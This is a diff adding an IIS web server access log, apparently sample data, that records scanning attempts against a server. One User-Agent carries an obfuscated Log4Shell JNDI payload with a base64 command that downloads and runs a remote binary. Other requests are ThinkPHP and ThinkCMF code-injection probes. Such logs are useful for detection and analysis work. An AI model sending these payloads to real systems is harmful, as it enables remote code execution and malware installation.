@@ -1,0 +1,12 @@
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2022-08-04 15:01:58
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2022-08-04 15:01:58 192.168.0.23 GET / - 80 - 85.163.125.91 Mozilla/5.0+(Windows+NT+6.1;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/51.0.2704.103+Safari/537.36 - 200 0 0 470
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2022-08-04 15:19:58
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2022-08-04 15:19:58 192.168.0.23 GET / - 80 - 172.99.188.246 t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//168.138.128.171:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTcyLjk5LjE4OC4yNDYvbG9sL3NtdHBzZXJ2ZXI7IGN1cmwgLU8gaHR0cDovLzE3Mi45OS4xODguMjQ2L2xvbC9zbXRwc2VydmVyOyBjaG1vZCA3Nzcgc210cHNlcnZlcjsgLi9zbXRwc2VydmVyIHJ1bm5lcg==}') t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//168.138.128.171:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTcyLjk5LjE4OC4yNDYvbG9sL3NtdHBzZXJ2ZXI7IGN1cmwgLU8gaHR0cDovLzE3Mi45OS4xODguMjQ2L2xvbC9zbXRwc2VydmVyOyBjaG1vZCA3Nzcgc210cHNlcnZlcjsgLi9zbXRwc2VydmVyIHJ1bm5lcg==}') 200 0 0 291
+2022-08-04 15:20:13 192.168.0.23 GET /index.php s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 80 - 185.7.214.104 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/78.0.3904.108+Safari/537.36 - 404 0 2 189
+2022-08-04 15:35:28 192.168.0.23 GET / a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> 80 - 185.7.214.104 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/78.0.3904.108+Safari/537.36 - 200 0 0 802
